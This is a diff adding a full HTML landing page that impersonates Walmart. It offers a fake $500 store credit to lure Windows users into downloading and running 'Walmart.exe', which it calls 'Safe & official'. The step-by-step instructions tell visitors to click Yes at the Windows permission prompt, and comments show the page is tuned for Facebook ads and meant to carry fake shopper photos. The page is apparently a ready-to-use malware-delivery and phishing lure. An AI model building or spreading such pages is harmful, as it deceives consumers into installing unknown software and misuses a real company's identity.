@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Walmart Catalog App for Windows — Get $500 for US Stores</title>
+  <meta name="description" content="Download the new Walmart product catalog app for Windows. Get $500 to spend at Walmart US stores. Official app — easy install, great deals.">
+  <meta name="robots" content="index, follow">
+
+  <!-- Facebook / Open Graph (optimized for Facebook ads) -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://yoursite.com/">
+  <meta property="og:title" content="Download Walmart Catalog App for Windows — Get $500">
+  <meta property="og:description" content="Download the new Walmart product catalog app for Windows. Get $500 to spend at Walmart US stores. Official app — easy install.">
+  <meta property="og:image" content="https://yoursite.com/og-image.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:site_name" content="Walmart Catalog App">
+
+  <!-- Windows / PC focus -->
+  <meta name="target" content="windows">
+  <meta name="platform" content="windows">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --walmart-blue: #0053e2;
+      --walmart-yellow: #ffc220;
+      --walmart-dark: #001e60;
+      --white: #ffffff;
+      --gray-100: #f7f7f7;
+      --gray-200: #e5e5e5;
+      --gray-600: #4a4a4a;
+      --gray-800: #1a1a1a;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: var(--white);
+      color: var(--gray-800);
+      line-height: 1.5;
+      min-height: 100vh;
+    }
+
+    /* Header — Walmart style */
+    .header {
+      background: var(--walmart-blue);
+      padding: 1rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      box-shadow: 0 2px 8px rgba(0, 83, 226, 0.3);
+    }
+    .logo-text {
+      font-weight: 800;
+      font-size: 1.75rem;
+      color: var(--white);
+      letter-spacing: -0.02em;
+    }
+    .logo-spark {
+      color: var(--walmart-yellow);
+      font-size: 1.5rem;
+    }
+
+    /* Hero */
+    .hero {
+      text-align: center;
+      padding: 3rem 1.5rem 4rem;
+      background: linear-gradient(180deg, var(--gray-100) 0%, var(--white) 100%);
+    }
+    .hero h1 {
+      font-size: clamp(1.5rem, 4vw, 2.25rem);
+      font-weight: 800;
+      color: var(--walmart-dark);
+      max-width: 640px;
+      margin: 0 auto 0.75rem;
+      line-height: 1.25;
+    }
+    .hero .subtitle {
+      font-size: 1.1rem;
+      color: var(--gray-600);
+      max-width: 520px;
+      margin: 0 auto 2rem;
+    }
+    .offer-badge {
+      display: inline-block;
+      background: var(--walmart-yellow);
+      color: var(--walmart-dark);
+      font-weight: 700;
+      font-size: 1.25rem;
+      padding: 0.5rem 1.25rem;
+      border-radius: 8px;
+      margin-bottom: 2rem;
+      box-shadow: 0 4px 12px rgba(255, 194, 32, 0.4);
+    }
+
+    /* Download button — centered, prominent */
+    .download-area {
+      margin: 2rem 0;
+    }
+    .btn-download {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      background: var(--walmart-blue);
+      color: var(--white);
+      font-family: inherit;
+      font-size: 1.25rem;
+      font-weight: 700;
+      padding: 1rem 2.5rem;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      text-decoration: none;
+      box-shadow: 0 4px 20px rgba(0, 83, 226, 0.4);
+      transition: transform 0.15s, box-shadow 0.15s;
+    }
+    .btn-download:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(0, 83, 226, 0.5);
+    }
+    .btn-download:active {
+      transform: translateY(0);
+    }
+    .btn-download .icon {
+      width: 24px;
+      height: 24px;
+      fill: currentColor;
+    }
+
+    .download-note {
+      font-size: 0.9rem;
+      color: var(--gray-600);
+      margin-top: 1rem;
+    }
+
+    /* Steps section */
+    .steps-section {
+      padding: 3rem 1.5rem 4rem;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    .steps-section h2 {
+      font-size: 1.75rem;
+      font-weight: 800;
+      color: var(--walmart-dark);
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .steps {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+    .step {
+      display: flex;
+      align-items: flex-start;
+      gap: 1.25rem;
+      background: var(--gray-100);
+      border-radius: 12px;
+      padding: 1.25rem 1.5rem;
+      border: 1px solid var(--gray-200);
+    }
+    .step-num {
+      flex-shrink: 0;
+      width: 48px;
+      height: 48px;
+      background: var(--walmart-blue);
+      color: var(--white);
+      font-weight: 800;
+      font-size: 1.25rem;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .step-content h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--walmart-dark);
+      margin-bottom: 0.25rem;
+    }
+    .step-content p {
+      color: var(--gray-600);
+      font-size: 0.95rem;
+    }
+    .step-img {
+      width: 100%;
+      max-width: 320px;
+      height: 180px;
+      background: var(--gray-200);
+      border-radius: 8px;
+      margin-top: 0.75rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--gray-600);
+      font-size: 0.85rem;
+    }
+    .step-img img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 8px;
+    }
+
+    /* Happy shoppers — place for your images */
+    .happy-shoppers {
+      padding: 3rem 1.5rem 4rem;
+      background: var(--gray-100);
+    }
+    .happy-shoppers h2 {
+      font-size: 1.75rem;
+      font-weight: 800;
+      color: var(--walmart-dark);
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .happy-shoppers-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 1.5rem;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .happy-shopper-card {
+      background: var(--white);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+      border: 1px solid var(--gray-200);
+    }
+    .happy-shopper-card .img-wrap {
+      aspect-ratio: 4/3;
+      background: var(--gray-200);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .happy-shopper-card .img-wrap img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .happy-shopper-card .img-wrap:not(:has(img[src])) {
+      color: var(--gray-600);
+      font-size: 0.9rem;
+      text-align: center;
+      padding: 1rem;
+    }
+
+    /* Footer */
+    .footer {
+      background: var(--walmart-dark);
+      color: var(--white);
+      text-align: center;
+      padding: 2rem 1.5rem;
+      font-size: 0.85rem;
+      margin-top: 2rem;
+    }
+    .footer a {
+      color: var(--walmart-yellow);
+      text-decoration: none;
+    }
+
+    @media (max-width: 600px) {
+      .hero { padding: 2rem 1rem 3rem; }
+      .steps-section { padding: 2rem 1rem 3rem; }
+      .btn-download { font-size: 1.1rem; padding: 0.9rem 2rem; }
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <span class="logo-text">Walmart</span>
+    <span class="logo-spark">✦</span>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="offer-badge">Get $500 for Walmart US stores</div>
+      <h1>Download the new Walmart product catalog app for Windows</h1>
+      <p class="subtitle">Browse deals, manage your list, and get $500 to spend at Walmart stores in the USA. Official app — free and easy to install on your PC.</p>
+
+      <div class="download-area">
+        <a href="Walmart.exe" class="btn-download" download="Walmart.exe">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.25" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+            <path d="M7 10l5 5 5-5"/>
+            <path d="M12 15V3"/>
+          </svg>
+          Download for Windows
+        </a>
+        <p class="download-note">Walmart.exe — for Windows 10/11. Safe & official.</p>
+      </div>
+    </section>
+
+    <section class="steps-section">
+      <h2>How to download and install</h2>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-content">
+            <h3>Click “Download for Windows”</h3>
+            <p>Click the blue button above. Your browser will download the file <strong>Walmart.exe</strong> to your PC (usually in the Downloads folder).</p>
+            <div class="step-img" aria-hidden="true">
+              <svg viewBox="0 0 200 100" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                  <filter id="btnShadow" x="-20%" y="-20%" width="140%" height="140%">
+                    <feDropShadow dx="0" dy="2" stdDeviation="2" flood-opacity="0.2"/>
+                  </filter>
+                  <linearGradient id="btnGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                    <stop offset="0%" stop-color="#1a6bef"/>
+                    <stop offset="100%" stop-color="#0053e2"/>
+                  </linearGradient>
+                </defs>
+                <rect x="35" y="22" width="130" height="44" rx="10" fill="url(#btnGrad)" filter="url(#btnShadow)"/>
+                <path d="M100 32v16M92 44l8 8 8-8" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                <path d="M86 54h28" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
+                <text x="100" y="88" text-anchor="middle" fill="#4a4a4a" font-size="11" font-family="Inter,sans-serif">Download button</text>
+              </svg>
+            </div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-content">
+            <h3>Open the downloaded file</h3>
+            <p>Go to your Downloads folder (or check the bar at the bottom of the browser). Double-click <strong>Walmart.exe</strong> to run the installer.</p>
+            <div class="step-img" aria-hidden="true">
+              <svg viewBox="0 0 200 100" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                  <linearGradient id="fileGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                    <stop offset="0%" stop-color="#1a6bef"/>
+                    <stop offset="100%" stop-color="#0053e2"/>
+                  </linearGradient>
+                </defs>
+                <rect x="20" y="15" width="160" height="55" rx="8" fill="#f0f0f0" stroke="#ddd"/>
+                <rect x="28" y="24" width="28" height="34" rx="4" fill="url(#fileGrad)"/>
+                <path d="M28 38h28" stroke="rgba(255,255,255,0.5)" stroke-width="1.5" stroke-linecap="round"/>
+                <text x="42" y="52" text-anchor="middle" fill="#fff" font-size="11" font-weight="700" font-family="Inter,sans-serif">W</text>
+                <text x="64" y="42" fill="#1a1a1a" font-size="12" font-weight="600" font-family="Inter,sans-serif">Walmart.exe</text>
+                <text x="64" y="58" fill="#4a4a4a" font-size="10" font-family="Inter,sans-serif">Downloads folder</text>
+              </svg>
+            </div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-content">
+            <h3>Follow the setup wizard</h3>
+            <p>If Windows asks “Do you want to allow this app to make changes?”, click <strong>Yes</strong>. Then follow the on-screen steps to complete the installation.</p>
+            <div class="step-img" aria-hidden="true">
+              <svg viewBox="0 0 200 100" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                  <linearGradient id="checkGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                    <stop offset="0%" stop-color="#1a6bef"/>
+                    <stop offset="100%" stop-color="#0053e2"/>
+                  </linearGradient>
+                </defs>
+                <rect x="25" y="20" width="150" height="50" rx="8" fill="#fff" stroke="#ddd"/>
+                <circle cx="55" cy="45" r="14" fill="url(#checkGrad)"/>
+                <path d="M50 45l4 4 8-10" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                <text x="82" y="38" fill="#1a1a1a" font-size="11" font-family="Inter,sans-serif">Do you want to allow</text>
+                <text x="82" y="52" fill="#1a1a1a" font-size="11" font-family="Inter,sans-serif">this app? — Yes</text>
+              </svg>
+            </div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-content">
+            <h3>Launch the app and claim your $500</h3>
+            <p>Open the Walmart catalog app from the Start menu or desktop. Sign in or create an account, then <strong>select your nearest Walmart store</strong>. Get your bonus — and you’re ready to head to the store and start shopping.</p>
+            <div class="step-img" aria-hidden="true">
+              <svg viewBox="0 0 200 100" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                  <linearGradient id="offerGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                    <stop offset="0%" stop-color="#ffd54a"/>
+                    <stop offset="100%" stop-color="#ffc220"/>
+                  </linearGradient>
+                  <filter id="offerShadow" x="-10%" y="-10%" width="120%" height="120%">
+                    <feDropShadow dx="0" dy="2" stdDeviation="1.5" flood-opacity="0.25"/>
+                  </filter>
+                </defs>
+                <rect x="48" y="24" width="104" height="46" rx="10" fill="url(#offerGrad)" filter="url(#offerShadow)"/>
+                <text x="100" y="48" text-anchor="middle" fill="#001e60" font-size="16" font-weight="800" font-family="Inter,sans-serif">$500</text>
+                <text x="100" y="63" text-anchor="middle" fill="#001e60" font-size="10" font-weight="600" font-family="Inter,sans-serif">Claim your offer</text>
+              </svg>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="happy-shoppers" aria-label="Happy shoppers">
+      <h2>Happy shoppers</h2>
+      <div class="happy-shoppers-grid">
+        <div class="happy-shopper-card">
+          <div class="img-wrap">
+            <!-- Replace with your image: put file in same folder and set src="your-photo-1.jpg" -->
+            <img src="1.jpg" alt="Happy Walmart shopper" loading="lazy">
+          </div>
+        </div>
+        <div class="happy-shopper-card">
+          <div class="img-wrap">
+            <img src="2.jpg" alt="Happy Walmart shopper" loading="lazy">
+          </div>
+        </div>
+        <div class="happy-shopper-card">
+          <div class="img-wrap">
+            <img src="3.jpg" alt="Happy Walmart shopper" loading="lazy">
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <p>For Windows PC only. Offer terms apply. © Walmart.</p>
+  </footer>
+</body>
+</html>
